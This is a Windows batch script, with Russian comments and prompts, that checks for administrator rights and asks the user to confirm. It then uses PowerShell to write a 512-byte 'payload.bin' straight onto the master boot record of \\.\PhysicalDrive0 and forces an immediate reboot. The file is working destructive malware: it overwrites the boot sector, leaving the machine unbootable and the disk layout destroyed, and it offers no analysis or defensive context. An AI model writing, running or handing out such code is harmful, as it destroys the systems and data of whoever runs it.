@echo off
color 0c
chcp 65001 > nul

:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Запусти скрипт от имени Администратора!
    pause
    exit
)

:ask
echo ===================================================
set /p "choice=ЗАПИСАТЬ АССЕМБЛЕРНЫЙ SPAM-MBR И ПЕРЕЗАГРУЗИТЬ? (Y/N): "
echo ===================================================

if /i "%choice%"=="Y" goto destroy
if /i "%choice%"=="N" goto cancel
goto ask

:cancel
echo Отмена.
pause
exit

:destroy
echo Запись бинарного кода спама в MBR...

:: PowerShell читает готовый 512-байтовый бинарник payload.bin и зашивает в MBR
powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload.bin'); $stream = [io.file]::OpenWrite('\\.\PhysicalDrive0'); $stream.Write($bytes, 0, 512); $stream.Close();"

:: Мгновенный reboot для демонстрации эффекта
shutdown /r /t 0
